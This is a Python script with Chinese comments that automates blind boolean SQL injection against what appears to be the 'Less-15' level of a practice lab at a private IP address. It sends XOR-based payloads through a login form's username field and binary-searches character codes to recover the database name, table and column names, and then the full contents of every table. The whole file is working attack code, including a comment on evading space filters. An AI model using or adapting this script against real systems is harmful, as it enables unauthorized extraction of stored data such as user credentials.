import requests
import time

host = "http://192.168.120.139:30003/Less-15/"


def getDatabase():  # 获取数据库名
    global host
    ans = ''
    # 最外面的循环是数据库名的字符长度，就是从第几个字符开始
    for i in range(1, 1000):
        # ascii码常用字符是32-127
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            # 若是过滤了空格可以采用异或注入法绕过，这里的payload视情况而改
            payload = "1'^(ascii(substr((database()),%d,1))<%d)^1#" % (i, mid)
            # post传参的参数
            param = {"uname": payload, "passwd": "admin"}
            res = requests.post(host, data=param)
            # 若是返回不正确就将mid赋值给high，high值一直往左边移动直到high值到最左边，也就是等于low值时退出while循环
            # 运用该payload会一直返回正确的页面，直到mid等于正确的数值
            if "flag" not in res.text:
                high = mid
                # 若是匹配到正确页面返回的字符，low值就向右移动直到low值和high值重合
            else:
                low = mid + 1
            mid = (low + high) // 2
            # 判断当一个字符都没有匹配到时就退出循环，也就是mid一直在变小或者变大
        # 经过测试发现mid可用最小到32，最大到127，也就是一个字符也匹配不到
        if mid <= 32 or mid >= 127:
            # break直接跳出来最外面的for循环
            break
            # 因为这里如果匹配到正确的字符就返回low = mid +1
        # 然后到了最后退出while循环时，high = low ，这时的low是正确时的mid+1
        # 所以现在的mid - 1就是当时正确时的数值
        ans += chr(mid - 1)
    print("database is -> " + ans)
    print('\n')


def getTables():  # 获取数据表名
    global host
    tables = []
    ans = ''
    # 最外面的循环是表名的字符长度，就是从第几个字符开始
    for i in range(1, 1000):
        # ascii码常用字符是32-127
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            # 若是过滤了空格可以采用异或注入法绕过
            payload = "1'^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))<%d)^1#" % (
                i, mid)

            param = {"uname": payload, "passwd": "admin"}
            res = requests.post(host, data=param)
            # 若是返回不正确就将mid赋值给high，high值一直往左边移动直到high值到最左边，也就是等于low值时退出while循环
            # 运用该payload会一直返回正确的页面，直到mid等于正确的数值
            if "flag" not in res.text:
                high = mid
                # 若是匹配到正确页面返回的字符，low值就向右移动直到low值和high值重合
            else:
                low = mid + 1
            mid = (low + high) // 2
            # 判断当一个字符都没有匹配到时就退出循环，也就是mid一直在变小或者变大
        # 经过测试发现mid可用最小到32，最大到127，也就是一个字符也匹配不到
        if mid <= 32 or mid >= 127:
            # break直接跳出来最外面的for循环
            break
            # 因为这里如果匹配到正确的字符就返回low = mid +1
        # 然后到了最后退出while循环时，high = low ，这时的low是正确时的mid+1
        # 所以现在的mid - 1就是当时正确时的数值
        ans += chr(mid - 1)
    print("tables is -> " + ans)
    print('\n')
    # 使用split方法，将以逗号分隔的字符串转化成列表
    tables = ans.split(',')
    # 返回列表，方便下一个函数调用
    return tables


def getColumn(tables):  # 获取列名
    # 定义全局变量，方便在函数体中更改变量的值，虽然没改变
    global host
    dict = {}
    ans = ''
    # 最外面的循环是遍历所有的表名
    for table in tables:
        # 这里同上面的注释
        for i in range(1, 1000):
            low = 32
            high = 128
            mid = (low + high) // 2
            while low < high:
                payload = "1'^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='%s')),%d,1))<%d)^1#" % (
                    table, i, mid)
                param = {"uname": payload, "passwd": "admin"}
                res = requests.post(host, data=param)

                if "flag" not in res.text:
                    high = mid
                else:
                    low = mid + 1
                mid = (low + high) // 2
            if mid <= 32 or mid >= 127:
                break
                # 因为这里如果匹配到正确的字符就返回low = mid +1
            # 然后到了最后退出while循环时，high = low ，这时的low是正确时的mid+1
            # 所以现在的mid - 1就是当时正确时的数值
            ans += chr(mid - 1)
            # 使用字典，将表名和字段名对应存储，方便下面打印显示，这里的字段名是以列表的形式存储到字典中
        dict.setdefault(table, []).append(ans)
        # 将ans重新归0，重新变为另一张表的所有字段
        ans = ''
        # 这里遍历字典中的表名和其中的字段值
    for table, value in dict.items():
        # 定义一个值来显示是第几个字段，每遍历完一个表名的所有字段就将m变成1
        m = 1
        for s in value:
            # 这里返回一个字段列表，用split函数将字符串转为列表
            column = s.split(',')
            print('\n')
            print('-------------' + "%s表的字段开始爆破" % table + '-------------')
            # 这里是返回列表中的每一个值
            for i in column:
                print("%s表的第%d个子段是" % (table, m) + i)
                m += 1
    return dict


def tableDump(dict):
    global host
    ans = ''
    for table, value in dict.items():
        for s in value:
            column = s.split(',')
            print('--------开始爆%s表值--------' % table)
            for c in column:
                for i in range(1, 10000):
                    low = 32
                    high = 128
                    mid = (low + high) // 2
                    while low < high:
                        # url = host + "id=1^(ascii(substr((select(group_concat(password))from(users)),%d,1))<%d)^1" % (i,mid)
                        # res = requests.get(url)
                        payload = "1'^(ascii(substr((select(group_concat(%s))from(%s)),%d,1))<%d)^1#" % (c, table, i, mid)
                        param = {"uname": payload, "passwd": "admin"}
                        res = requests.post(url=host, data=param)
                        if "flag" not in res.text:
                            high = mid
                        else:
                            low = mid + 1
                        mid = (low + high) // 2
                        if mid <= 32 or mid >= 127:
                            break
                        # 因为这里如果匹配到正确的字符就返回low = mid +1
                    # 然后到了最后退出while循环时，high = low ，这时的low是正确时的mid+1
                    # 所以现在的mid - 1就是当时正确时的数值
                    ans += chr(mid - 1)
                print("表名：%s   字段名：%s  值是：%s" % (table, c, ans))
                ans = ''


if __name__ == '__main__':
    start = time.time()
    getDatabase()
    tables = getTables()
    dict = getColumn(tables)
    tableDump(dict)
    end = time.time()
    print("总共花费时间" + str(end - start) + "  s")